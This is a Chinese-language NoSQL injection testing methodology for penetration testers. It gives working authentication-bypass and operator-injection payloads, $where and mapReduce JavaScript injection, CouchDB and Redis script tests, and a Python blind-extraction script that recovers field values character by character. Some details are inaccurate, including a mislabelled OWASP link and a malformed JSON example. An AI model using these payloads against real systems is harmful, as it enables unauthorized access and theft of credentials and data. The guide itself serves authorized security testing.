# NoSQL 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 NoSQL 注入漏洞的系统化测试流程，确保对使用 NoSQL 数据库的应用进行全面、标准化的注入测试覆盖。

## 1.2 适用范围
适用于使用 MongoDB、Redis、CouchDB、Elasticsearch、Cassandra 等 NoSQL 数据库的 Web 应用、API 接口和移动应用后端。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：NoSQL 注入系统化测试

### 2.1 技术介绍

NoSQL 注入测试是指通过系统化的方法，检测应用中所有可能的 NoSQL 注入点。由于 NoSQL 数据库使用不同的查询语法（如 JSON/BSON），注入方式与 SQL 注入有所不同，主要利用操作符注入（`$ne`、`$gt`、`$regex` 等）。

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **输入点** | JSON 请求体、URL 参数、POST 表单、HTTP 头 |
| **数据库类型** | MongoDB、Redis、CouchDB、Elasticsearch |
| **注入类型** | 认证绕过、数据提取、操作符注入、JavaScript 注入 |
| **业务功能** | 登录、搜索、API 查询、数据筛选 |

### 2.3 测试流程

#### 2.3.1 输入点发现与枚举

**步骤 1：API 端点发现**
```
# 爬取 API 端点
gobuster dir -u http://target/api -w api-endpoints.txt
dirb http://target/api

# 查找 API 文档
http://target/swagger.json
http://target/api-docs
http://target/openapi.yaml
```

**步骤 2：请求格式分析**
```
# 识别请求格式
- JSON: Content-Type: application/json
- Form: Content-Type: application/x-www-form-urlencoded
- XML: Content-Type: application/xml
```

**步骤 3：参数类型分析**
```
# JSON 参数
{"username": "admin", "password": "secret"}

# 查询参数
?filter={"status":"active"}
?q={"price":{"$lt":100}}
```

#### 2.3.2 初步探测

**通用探测 Payload：**

```
# 基础操作符测试（URL 编码）
username[$ne]=test&password[$ne]=test

# JSON 格式
{"username": {"$ne": null}, "password": {"$ne": null}}

# 数组注入
username[$in][0]=admin&username[$in][1]=test

# 正则匹配
username[$regex]=^adm

# 比较操作符
age[$gt]=0
age[$gte]=0
price[$lt]=0
price[$lte]=0

# JavaScript 注入
$where=function(){return true}
```

**响应分析：**
- 认证被绕过（登录成功）
- 返回数据量异常
- NoSQL 错误信息
- 响应时间差异

#### 2.3.3 数据库类型识别

**错误信息识别：**

| 错误信息特征 | 数据库类型 |
|------------|-----------|
| `MongoError` / `MongoServerError` | MongoDB |
| `Redis exception` | Redis |
| `CouchDB` / `Couchbase` | CouchDB/Couchbase |
| `Elasticsearch exception` | Elasticsearch |
| `CQLSyntaxException` | Cassandra |

**特征探测：**

```
# MongoDB - $where 注入
{"$where": "return true"}

# Elasticsearch - 查询 DSL
{"query": {"match_all": {}}}

# CouchDB - _all_docs
GET /_all_docs
```

#### 2.3.4 注入类型判断

**认证绕过检测：**
```
# 不等于测试
{"username": {"$ne": null}, "password": {"$ne": null}}

# 在列表中测试
{"username": {"$in": ["admin", "user"]}, "password": {"$ne": "wrong"}}

# 正则测试
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
```

**数据提取检测：**
```
# 返回所有文档
{"$where": "return true"}

# 字段投影
{"$project": {"password": 1}}
```

**JavaScript 注入检测：**
```
# $where 注入
{"$where": "this.password.length > 0"}

# mapReduce 注入
{"map": function(){emit(this.username, this.password)}}
```

### 2.4 测试用例清单

#### 2.4.1 MongoDB 测试

```
# 认证绕过
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}

# 用户枚举
POST /api/login
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}

# 逐字符爆破
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": "admin", "password": {"$regex": "^ad.*"}}

# $where 注入
{"$where": "this.username == 'admin'"}

# 字段枚举
{"$where": "this.password != undefined"}

# 数据提取
GET /api/users?filter={"$where":"return this.role=='admin'"}

# 聚合管道注入
{"pipeline": [{"$match": {"$expr": {"$gt": ["$balance", 0]}}}]
```

#### 2.4.2 Redis 测试

```
# 命令注入（如果存在 EVAL）
EVAL "return redis.call('GET', 'password')" 0

# Lua 脚本注入
EVAL "local a = 'test'; return a" 0
```

#### 2.4.3 CouchDB 测试

```
# 视图注入
POST /db/_temp_view
{"language": "javascript", "map": "function(doc){emit(doc.username, doc.password)}"}

# Mango 查询注入
POST /db/_find
{"selector": {"username": {"$ne": null}}}
```

#### 2.4.4 Elasticsearch 测试

```
# 查询 DSL 注入
POST /index/_search
{"query": {"match": {"username": "admin' OR '1'='1"}}}

# Script 注入
{"script": {"inline": "return params.a + params.b", "params": {"a": "malicious", "b": "code"}}}
```

#### 2.4.5 HTTP 头测试

```
# Content-Type 注入
Content-Type: application/json
{"username": {"$ne": null}}

# 自定义头注入
X-User-Id: {"$ne": null}
X-API-Key: admin' OR '1'='1
```

### 2.5 自动化测试工具

#### NoSQLMap 使用指南

```bash
# 基础扫描
python NoSQLMap.py
# 选择目标
# 选择攻击类型

# MongoDB 测试
nosqlmap --target http://target/api/login --method POST

# 自定义 Payload
nosqlmap --payload '{"username": {"$ne": null}}'
```

#### Burp Suite 测试

```
# 使用 Intruder 模块
# Payload: {"username": {"$ne": "PAYLOAD"}, "password": {"$ne": ""}}
# 观察响应长度变化
```

### 2.6 测试报告要点

测试完成后，报告应包含：
1. 所有测试的输入点列表
2. 发现的漏洞点及详情
3. NoSQL 数据库类型和版本
4. 注入类型分类
5. 可访问的数据范围
6. 修复建议

---

# 第三部分：附录

## 3.1 MongoDB 操作符速查表

| 类别 | 操作符 | 说明 | 示例 |
|-----|--------|------|------|
| **比较** | `$eq` | 等于 | `{"field": {"$eq": value}}` |
| **比较** | `$ne` | 不等于 | `{"field": {"$ne": null}}` |
| **比较** | `$gt` | 大于 | `{"age": {"$gt": 18}}` |
| **比较** | `$gte` | 大于等于 | `{"age": {"$gte": 18}}` |
| **比较** | `$lt` | 小于 | `{"age": {"$lt": 18}}` |
| **比较** | `$lte` | 小于等于 | `{"age": {"$lte": 18}}` |
| **逻辑** | `$in` | 在列表中 | `{"role": {"$in": ["admin"]}}` |
| **逻辑** | `$nin` | 不在列表中 | `{"role": {"$nin": ["user"]}}` |
| **逻辑** | `$or` | 或 | `{"$or": [{cond1}, {cond2}]}` |
| **逻辑** | `$and` | 与 | `{"$and": [{cond1}, {cond2}]}` |
| **逻辑** | `$not` | 非 | `{"field": {"$not": {"$eq": value}}}` |
| **正则** | `$regex` | 正则匹配 | `{"name": {"$regex": "^adm"}}` |
| **正则** | `$options` | 正则选项 | `{"$regex": "pattern", "$options": "i"}` |
| **数组** | `$all` | 包含所有 | `{"tags": {"$all": ["a", "b"]}}` |
| **数组** | `$elemMatch` | 元素匹配 | `{"scores": {"$elemMatch": {"$gt": 80}}}` |

## 3.2 盲注测试脚本示例

```python
import requests
import string

def blind_injection(target, field, collection):
    result = ""
    for i in range(1, 50):  # 最多 50 个字符
        for char in string.ascii_lowercase + string.digits + "_":
            payload = {
                collection: {
                    "$where": f"this.{field}.match(/^{result}{char}/)"
                }
            }
            response = requests.post(target, json=payload)
            if len(response.text) > 100:  # 根据响应长度判断
                result += char
                print(f"Found: {result}")
                break
    return result
```

## 3.3 参考资源

- [OWASP NoSQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger - NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [MongoDB Security Documentation](https://www.mongodb.com/docs/manual/security/)
- [NoSQLMap Project](https://github.com/codingo/NoSQLMap)
